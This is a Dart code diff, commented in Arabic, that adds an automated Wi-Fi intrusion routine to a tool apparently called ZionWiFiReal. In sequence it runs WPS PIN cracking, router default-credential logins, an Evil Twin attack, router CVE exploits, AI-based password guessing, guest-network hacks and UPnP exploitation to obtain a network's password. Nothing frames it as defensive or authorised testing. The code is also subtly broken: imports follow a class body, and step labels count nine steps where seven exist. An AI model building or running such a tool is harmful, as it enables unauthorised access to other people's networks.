@@ -509,3 +509,115 @@ class FullAttackResult {
   
   Duration get duration => endTime!.difference(startTime!);
 }
+
+// ==================== إضافة الاستراتيجيات الجديدة ====================
+
+import 'zion_router_exploits.dart';
+import 'zion_ai_password_guesser.dart';
+import 'zion_guest_network_hack.dart';
+import 'zion_upnp_hack.dart';
+
+extension ZionWiFiRealExtensions on ZionWiFiReal {
+  
+  // استراتيجية 4: ثغرات الراوتر المعروفة
+  Future<ExploitResult> tryRouterExploit(String routerIp, String brand) async {
+    final exploits = RouterExploits();
+    return await exploits.tryRouterExploit(routerIp, brand);
+  }
+  
+  // استراتيجية 5: هجوم الذكاء الاصطناعي
+  Future<Map<String, dynamic>> tryAIGuess(String bssid, String ssid) async {
+    final aiGuesser = AIPasswordGuesser();
+    return await aiGuesser.fullAIAttack(bssid, ssid);
+  }
+  
+  // استراتيجية 6: شبكات الضيوف
+  Future<GuestNetworkResult> hackGuestNetwork(String routerIp) async {
+    final guestHack = GuestNetworkHack();
+    return await guestHack.hackGuestNetwork(routerIp);
+  }
+  
+  // استراتيجية 7: استغلال UPnP
+  Future<UPnPResult> hackViaUPnP(String routerIp) async {
+    final upnpHack = UPnPHack();
+    return await upnpHack.hackViaUPnP(routerIp);
+  }
+  
+  // الهجوم المتكامل الموسع (جميع الاستراتيجيات)
+  Future<FullAttackResult> fullAttackExtended(String target, {String? routerIp}) async {
+    final result = FullAttackResult(target: target);
+    result.startTime = DateTime.now();
+    
+    // 1. WPS PIN
+    print('🔑 [1/9] WPS PIN attack...');
+    final wpsResult = await hackWPSPin(target);
+    result.steps['wps'] = wpsResult;
+    if (_checkSuccess(result, wpsResult.success, wpsResult.wifiInfo?.ssid)) return result;
+    
+    // 2. Router default credentials
+    if (routerIp != null) {
+      print('🏠 [2/9] Router default credentials...');
+      final routerResult = await hackRouterDefaultCredentials(routerIp);
+      result.steps['router_default'] = routerResult;
+      if (_checkSuccess(result, routerResult.success, routerResult.wifiPassword)) return result;
+    }
+    
+    // 3. Evil Twin
+    final ssid = await _getSSIDFromBSSID(target);
+    if (ssid != null && ssid.isNotEmpty) {
+      print('🎭 [3/9] Evil Twin attack...');
+      final evilResult = await evilTwinAttack(ssid);
+      result.steps['eviltwin'] = evilResult;
+      if (_checkSuccess(result, evilResult.success, evilResult.capturedPassword)) return result;
+    }
+    
+    // 4. Router exploits (CVE)
+    if (routerIp != null) {
+      print('💣 [4/9] Router exploits (CVE)...');
+      final brand = await detectRouterBrand(routerIp);
+      if (brand != null) {
+        final exploitResult = await tryRouterExploit(routerIp, brand);
+        result.steps['exploits'] = exploitResult;
+        if (_checkSuccess(result, exploitResult.success, exploitResult.wifiPassword)) return result;
+      }
+    }
+    
+    // 5. AI Password Guesser
+    if (ssid != null && ssid.isNotEmpty) {
+      print('🧠 [5/9] AI password guesser...');
+      final aiResult = await tryAIGuess(target, ssid);
+      result.steps['ai_guesser'] = aiResult;
+      if (aiResult['success'] == true && _checkSuccess(result, true, aiResult['password'])) return result;
+    }
+    
+    // 6. Guest Network
+    if (routerIp != null) {
+      print('👤 [6/9] Guest network...');
+      final guestResult = await hackGuestNetwork(routerIp);
+      result.steps['guest'] = guestResult;
+      if (_checkSuccess(result, guestResult.success, guestResult.guestPassword)) return result;
+    }
+    
+    // 7. UPnP
+    if (routerIp != null) {
+      print('🔌 [7/9] UPnP exploitation...');
+      final upnpResult = await hackViaUPnP(routerIp);
+      result.steps['upnp'] = upnpResult;
+      if (_checkSuccess(result, upnpResult.success, upnpResult.password)) return result;
+    }
+    
+    result.success = false;
+    result.endTime = DateTime.now();
+    return result;
+  }
+  
+  bool _checkSuccess(FullAttackResult result, bool success, dynamic password) {
+    if (success && password != null && password.toString().isNotEmpty) {
+      result.success = true;
+      result.password = password.toString();
+      result.endTime = DateTime.now();
+      return true;
+    }
+    return false;
+  }
+}
